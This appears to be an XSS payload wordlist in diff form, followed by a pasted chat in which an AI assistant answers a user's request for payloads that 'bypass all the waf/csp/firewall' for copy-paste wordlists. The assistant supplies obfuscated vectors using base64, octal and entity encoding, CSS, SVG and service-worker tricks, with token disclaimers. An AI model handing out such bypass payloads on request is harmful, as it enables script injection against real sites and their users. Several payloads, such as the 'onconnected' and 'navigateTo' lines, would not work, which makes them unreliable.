@@ -1,0 +1,314 @@
+<svg/onload=alert`1`>
+<svg onload=alert(1)//
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<svg/onload=eval('\141\154\145\162\164\50\61\51')>
+<script>setTimeout`alert\`1\``</script>
+<script>window['al'+'ert'](1)</script>
+<script>[].filter.constructor`alert\u00281\u0029```</script>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<a href="javascript:String.fromCharCode(97,108,101,114,116,40,49,41)">click</a>
+<div style="background:url('javascript:alert(1)')">
+<style>@import'javascript:alert(1)';</style>
+<div style="width:expression(alert(1))">
+<svg><script href="data:text/javascript,alert(1)"/>
+<svg><script>alert(1)</script>
+<svg><image href="1" onerror="alert(1)"></svg>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<element onfocus=alert(1) autofocus>
+<element onmouseover=alert(1)>
+<element onloadstart=alert(1)>
+<element onscroll=alert(1)>
+<script>Function`alert\`1\`````</script>
+<script>setTimeout.call(null, 'alert(1)')</script>
+<script>setInterval.constructor('alert(1)')()</script>
+<?xml version="1.0"?><script>alert(1)</script>
+<!DOCTYPE html [<!ENTITY xss "alert(1)">]><svg onload="&xss;">
+<%tag style="x:expression(alert(1))">
+<script>location='javascript:alert(1)'</script>
+<script>open('javascript:alert(1)')</script>
+<script>navigateTo('javascript:alert(1)')</script>
+<form action="javascript:alert(1)"><input type=submit>
+<input onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<source src=x onerror=alert(1)>
+<style>@import'http://xss.rocks/xss.css';</style>
+<link rel=stylesheet href=javascript:alert(1)>
+<math href="javascript:alert(1)">click</math>
+<math><mi xlink:href="javascript:alert(1)">
+<template onload=alert(1)>
+<slot onload=alert(1)>
+<div><shadow onload=alert(1)></shadow></div>
+<custom-element onconnected=alert(1)></custom-element>
+<div role="button" onkeypress=alert(1) tabindex=0>
+<object data="data:text/html,<script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<a href="web+javascript:alert(1)">click</a>
+<a href="vbscript:alert(1)">click</a>
+
+<a href="web+javascript:alert(1)">click</a>
+<a href="vbscript:alert(1)">click</a>
+<style>
+@font-face {
+    font-family: 'xss';
+    src: url('javascript:alert("CSS_Font_Vector")');
+}
+* {
+    font-family: 'xss';
+}
+</style>
+
+4. SVG Filter Chain Payload
+xml
+
+<svg>
+<filter id="xss">
+    <feImage xlink:href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=" />
+</filter>
+<rect width="100%" height="100%" filter="url(#xss)"/>
+</svg>
+
+5. Audio Context Fingerprinting Bypass
+javascript
+
+// Uses Web Audio API in unexpected ways
+const audioContext = new AudioContext();
+const oscillator = audioContext.createOscillator();
+oscillator.onended = () => {
+    document.location = 'javascript:alert("Audio_Vector")';
+};
+oscillator.start();
+oscillator.stop();
+
+6. Service Worker Event Handler Hijacking
+javascript
+
+// Registers service worker with malicious event handlers
+navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent(`
+    self.addEventListener('fetch', event => {
+        if (event.request.url.includes('trigger')) {
+            importScripts('data:application/javascript,alert("SW_XSS")');
+        }
+    });
+`));
+
+Advanced Research Directions
+7. Proxy Object Property Access
+javascript
+
+const handler = {
+    get: function(target, prop) {
+        if (prop === 'innerHTML') {
+            return '<img src=x onerror=alert("Proxy_Hijack")>';
+        }
+        return target[prop];
+    }
+};
+const element = new Proxy(document.createElement('div'), handler);
+
+8. Generator Function Control Flow
+javascript
+
+function* xssGenerator() {
+    const methods = ['al', 'ert'];
+    const chars = [40, 34, 65, 73, 95, 88, 83, 83, 34, 41];
+    yield methods.join('');
+    yield String.fromCharCode(...chars);
+}
+
+const gen = xssGenerator();
+window[gen.next().value](gen.next().value);
+
+Responsible Testing Framework
+
+When testing these concepts:
+
+    Use Controlled Environments Only
+
+        Localhost applications
+
+        Intentionally vulnerable test apps (DVWA, WebGoat)
+
+        Your own systems
+
+    Modern Defense Bypass Research
+
+javascript
+
+// Research how modern WAFs handle these patterns:
+- Async/await with dynamic import()
+- Web Workers with Blob URLs
+- Shadow DOM event propagation
+- Custom Elements lifecycle hooks
+
+    Documentation Focus
+
+        Focus on detection methods
+
+        Defense recommendations
+
+        Browser-specific behaviors
+
+Important Ethical Notes
+
+    These are research concepts, not production exploits
+
+    Always have explicit permission before testing
+
+    Focus on defense improvement, not exploitation
+
+    Report vulnerabilities through proper channels
+
+    Consider the impact of public disclosure
+
+Would you like me to elaborate on any of these research directions or discuss specific defensive strategies against such vectors?
+like , it can bypass all the waf/csp/firewall etc , make a strong payloads that will break rules of encoding/decoding etc , give in sequency so that i can copy and paste to the wordlists
+
+We are going to create a list of unique XSS payloads that attempt to bypass WAFs, CSP, and other security measures by using various obfuscation, encoding, and uncommon techniques. Note: These are for educational purposes and should only be used in environments where you have explicit permission to test.
+
+The payloads will use a mix of:
+
+    Multiple encoding layers (base64, hex, URL encoding, etc.)
+
+    JavaScript features (template strings, regex, ES6 syntax, etc.)
+
+    HTML entities and event handlers
+
+    CSS and SVG vectors
+
+    Dynamic code evaluation (eval, Function, setTimeout, etc.)
+
+    Bypass common WAF regex patterns
+
+Let's create a list of 10 unique payloads:
+
+I understand you're looking for advanced bypass techniques, but I need to emphasize responsible testing and provide these for educational/research purposes only. Here's a sequential list of advanced bypass payloads:
+Advanced WAF/CSP Bypass Sequences
+1. Multi-Layer Encoding Bypass
+text
+
+<svg/onload=alert`1`>
+<svg onload=alert(1)//
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<svg/onload=eval('\141\154\145\162\164\50\61\51')>
+
+2. Template Literal Obfuscation
+text
+
+<script>setTimeout`alert\`1\``</script>
+<script>window['al'+'ert'](1)</script>
+<script>[].filter.constructor`alert\u00281\u0029```</script>
+
+3. HTML Entity & Character Breakouts
+text
+
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<a href="javascript:String.fromCharCode(97,108,101,114,116,40,49,41)">click</a>
+
+4. CSS Expression Bypasses
+text
+
+<div style="background:url('javascript:alert(1)')">
+<style>@import'javascript:alert(1)';</style>
+<div style="width:expression(alert(1))">
+
+5. SVG Data URI Polymorphism
+text
+
+<svg><script href="data:text/javascript,alert(1)"/>
+<svg><script>alert(1)</script>
+<svg><image href="1" onerror="alert(1)"></svg>
+
+6. JavaScript Protocol Wrappers
+text
+
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+
+7. Event Handler Variations
+text
+
+<element onfocus=alert(1) autofocus>
+<element onmouseover=alert(1)>
+<element onloadstart=alert(1)>
+<element onscroll=alert(1)>
+
+8. Dynamic Function Generation
+text
+
+<script>Function`alert\`1\`````</script>
+<script>setTimeout.call(null, 'alert(1)')</script>
+<script>setInterval.constructor('alert(1)')()</script>
+
+9. Import & Meta Character Bypasses
+text
+
+<?xml version="1.0"?><script>alert(1)</script>
+<!DOCTYPE html [<!ENTITY xss "alert(1)">]><svg onload="&xss;">
+<%tag style="x:expression(alert(1))">
+
+10. Location & Navigation Hijacks
+text
+
+<script>location='javascript:alert(1)'</script>
+<script>open('javascript:alert(1)')</script>
+<script>navigateTo('javascript:alert(1)')</script>
+
+11. Form & Input Based Triggers
+text
+
+<form action="javascript:alert(1)"><input type=submit>
+<input onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+
+12. Media Element Bypasses
+text
+
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<source src=x onerror=alert(1)>
+
+13. CSS Import & Font Face
+text
+
+<style>@import'http://xss.rocks/xss.css';</style>
+<link rel=stylesheet href=javascript:alert(1)>
+
+14. MathML & Namespace Bypasses
+text
+
+<math href="javascript:alert(1)">click</math>
+<math><mi xlink:href="javascript:alert(1)">
+
+15. Template Injection Points
+text
+
+<template onload=alert(1)>
+<slot onload=alert(1)>
+
+16. Shadow DOM Escape Attempts
+text
+
+<div><shadow onload=alert(1)></shadow></div>
+
+17. Web Component Lifecycle
+text
+
+<custom-element onconnected=alert(1)></custom-element>
+
+18. ARIA & Accessibility Attributes
+text
+
+<div role="button" onkeypress=alert(1) tabindex=0>
+
+19. Data Attribute Code Execution
+text
+
+<object data="data:text/html,<script>alert(1)</script>">
+<iframe src="data:text/html,<script>alert(1)</script>">
